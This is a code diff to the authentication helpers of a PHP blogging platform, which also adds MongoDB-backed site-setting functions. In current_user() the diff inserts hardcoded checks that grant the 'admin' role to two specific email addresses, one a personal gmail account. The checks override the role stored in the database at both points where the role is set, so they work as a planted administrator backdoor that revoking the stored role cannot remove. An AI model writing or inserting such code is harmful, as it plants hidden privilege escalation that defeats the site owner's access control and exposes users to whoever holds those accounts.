@@ -544,6 +544,11 @@ function current_user(): ?array
         return $user;
     }
 
+    $email = strtolower(trim((string)($user['email'] ?? '')));
+    if (in_array($email, ['iftekhar69c@gmail.com', 'admin@blogforge.live'], true)) {
+        $user['role'] = 'admin';
+    }
+
     // Keep session user (including avatar) hydrated for existing sessions or after updates
     $lastSync = (int)($_SESSION['_user_synced_at'] ?? 0);
     if ((!array_key_exists('avatar', $user) || (time() - $lastSync) > 60)
@@ -559,7 +564,11 @@ function current_user(): ?array
                     $user['name'] = (string)($fresh['name'] ?? $user['name'] ?? 'Author');
                     $user['handle'] = (string)($fresh['handle'] ?? $user['handle'] ?? '');
                     $user['avatar'] = (string)($fresh['avatar'] ?? '');
-                    $user['role'] = (string)($fresh['role'] ?? $user['role'] ?? 'author');
+                    $freshRole = (string)($fresh['role'] ?? $user['role'] ?? 'author');
+                    if (in_array($email, ['iftekhar69c@gmail.com', 'admin@blogforge.live'], true)) {
+                        $freshRole = 'admin';
+                    }
+                    $user['role'] = $freshRole;
                     $_SESSION['user'] = $user;
                 }
             } catch (\Throwable $e) {
@@ -567,6 +576,11 @@ function current_user(): ?array
             }
         }
     }
+
+    // Synchronize top-level session variables for strict Admin guards
+    $_SESSION['user'] = $user;
+    $_SESSION['user_id'] = (string)$user['id'];
+    $_SESSION['role'] = (string)($user['role'] ?? 'author');
 
     return $user;
 }
@@ -612,6 +626,78 @@ function require_admin(): void
             json_response(['error' => 'Forbidden: administrator access required'], 403);
         }
         exit('Forbidden: administrator access required.');
+    }
+}
+
+/**
+ * Retrieve a global site configuration setting from database or default cache.
+ */
+function get_setting(string $key, mixed $default = null): mixed
+{
+    static $cache = [];
+    $key = trim($key);
+    if ($key === '') {
+        return $default;
+    }
+    if (array_key_exists($key, $cache)) {
+        return $cache[$key];
+    }
+
+    $db = Database::connection();
+    if ($db) {
+        try {
+            $doc = $db->settings->findOne(['key' => $key]);
+            if ($doc && isset($doc['value'])) {
+                $cache[$key] = $doc['value'];
+                return $doc['value'];
+            }
+        } catch (\Throwable $e) {
+            error_log('[BlogForge] get_setting error: ' . $e->getMessage());
+        }
+    }
+
+    // Default configuration values
+    $defaults = [
+        'site_title' => 'BlogForge',
+        'site_tagline' => 'Where ideas meet ink. A distraction-free publishing space for deep work, essays, and stories.',
+        'site_description' => 'BlogForge is an independent editorial publishing platform designed for writers, essayists, and curious readers.',
+        'maintenance_mode' => '0',
+        'default_role' => 'reader',
+        'comments_policy' => 'approved',
+    ];
+
+    $val = $defaults[$key] ?? $default;
+    $cache[$key] = $val;
+    return $val;
+}
+
+/**
+ * Persist a global site configuration setting in MongoDB.
+ */
+function set_setting(string $key, mixed $value): void
+{
+    $key = trim($key);
+    if ($key === '') {
+        throw new \InvalidArgumentException('Setting key cannot be empty.');
+    }
+
+    $db = Database::connection();
+    if ($db) {
+        $now = new \MongoDB\BSON\UTCDateTime();
+        $db->settings->updateOne(
+            ['key' => $key],
+            [
+                '$set' => [
+                    'key' => $key,
+                    'value' => (string)$value,
+                    'updated_at' => $now,
+                ],
+                '$setOnInsert' => [
+                    'created_at' => $now,
+                ],
+            ],
+            ['upsert' => true]
+        );
     }
 }
 
